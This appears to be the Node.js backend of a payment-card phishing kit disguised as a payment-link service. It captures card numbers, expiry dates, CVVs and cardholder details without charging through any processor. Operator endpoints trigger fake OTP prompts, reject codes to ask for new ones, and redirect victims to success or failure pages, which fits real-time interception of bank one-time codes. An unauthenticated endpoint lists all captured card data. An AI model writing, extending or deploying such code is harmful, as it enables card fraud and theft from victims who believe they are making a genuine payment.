import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import crypto from "crypto";
import { createServer } from "http";
import { Server } from "socket.io";
import path from "path";
import { fileURLToPath } from "url";
import TelegramBot from "node-telegram-bot-api";
import dotenv from "dotenv";

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, { /* add options if needed */ });

// Middleware
app.use(bodyParser.json());
app.use(cors());
// Serve static files from your public folder
app.use(express.static(path.join(__dirname, "public")));

// In‑memory storage (for demo only)
const transactions = new Map();
const paymentLinks = new Map();

// Telegram bot setup (ensure TELEGRAM_BOT_TOKEN is set in your .env file)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// ==================== Endpoints ====================

// Generate payment link endpoint (returns link to landing.html with pid)
app.post("/api/generatePaymentLink", (req, res) => {
  const { amount, description } = req.body;
  const invoiceId = crypto.randomBytes(4).toString("hex").toUpperCase();
  const paymentLink = `${req.protocol}://${req.get("host")}/landing.html?pid=${invoiceId}`;
  paymentLinks.set(invoiceId, { amount, description, paymentLink, createdAt: new Date().toISOString() });
  console.log("Payment link generated:", paymentLink);
  res.json({ status: "success", paymentLink });
});

// Get payment details (for landing & payment pages)
app.get("/api/getPaymentDetails", (req, res) => {
  const { pid } = req.query;
  if (!pid || !paymentLinks.has(pid)) {
    return res.status(404).json({ status: "error", message: "Payment details not found" });
  }
  const payment = paymentLinks.get(pid);
  res.json({ status: "success", payment });
});

// Get all transactions (for admin panel)
app.get("/api/transactions", (req, res) => {
  const txList = Array.from(transactions.values());
  res.json(txList);
});

// Process payment details from main payment page
app.post("/api/sendPaymentDetails", (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
  const invoiceId = crypto.randomBytes(4).toString("hex").toUpperCase();
  const transaction = {
    id: invoiceId,
    cardNumber,
    expiry,
    cvv,
    email,
    amount: amount.toString().replace(/,/g, ""),
    currency,
    cardholder,
    status: "processing",
    otp: null,
    otpShown: false,
    otpEntered: null,
    otpError: false,
    redirectStatus: null,
    timestamp: new Date().toLocaleString()
  };
  transactions.set(invoiceId, transaction);
  console.log("New transaction recorded:", transaction);
  res.json({ status: "success", invoiceId });
});

// Show OTP (admin command)
app.post("/api/showOTP", (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
  txn.otpShown = true;
  txn.status = "otp_pending";
  txn.otpError = false;
  io.to(invoiceId).emit("show_otp", { otpError: false });
  res.json({ status: "success", message: "OTP form will be shown to user" });
});

// Mark OTP as wrong (admin command)
app.post("/api/wrongOTP", (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
  txn.otpError = true;
  txn.status = "otp_pending";
  io.to(invoiceId).emit("show_otp", { otpError: true });
  res.json({ status: "success", message: "OTP marked as wrong" });
});

// Check transaction status (polled by main payment page)
app.get("/api/checkTransactionStatus", (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction details not found" });
  if (txn.status === "otp_pending" && txn.otpShown) {
    return res.json({ status: "show_otp", message: "Show OTP form to user", otpError: txn.otpError });
  }
  if (txn.redirectStatus) {
    const redirectUrl = txn.redirectStatus === "success"
      ? `/success.html?invoiceId=${invoiceId}`
      : `/fail.html?invoiceId=${invoiceId}`;
    return res.json({ status: "redirect", redirectUrl });
  }
  res.json({ status: txn.status, otpError: txn.otpError });
});

// Submit OTP from main payment page
app.post("/api/submitOTP", (req, res) => {
  const { invoiceId, otp } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
  txn.otpEntered = otp;
  txn.status = "otp_received";
  txn.otpError = false;
  console.log(`OTP received for transaction ${invoiceId}: ${otp}`);
  res.json({ status: "success", message: "OTP received" });
});

// Update redirect status (admin command: success or fail)
app.post("/api/updateRedirectStatus", (req, res) => {
  const { invoiceId, redirectStatus } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
  txn.redirectStatus = redirectStatus;
  console.log(`Transaction ${invoiceId} redirect status updated to: ${redirectStatus}`);
  const redirectUrl = redirectStatus === "success"
    ? `/success.html?invoiceId=${invoiceId}`
    : `/fail.html?invoiceId=${invoiceId}`;
  io.to(invoiceId).emit("redirect", { redirectUrl });
  res.json({ status: "success", invoiceId, redirectStatus, redirectUrl });
});

// Socket.IO connection handler
io.on("connection", (socket) => {
  console.log("A client connected");
  socket.on("join", (invoiceId) => {
    socket.join(invoiceId);
    console.log(`Client joined room: ${invoiceId}`);
  });
});

const PORT = process.env.PORT || 3000;
httpServer.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
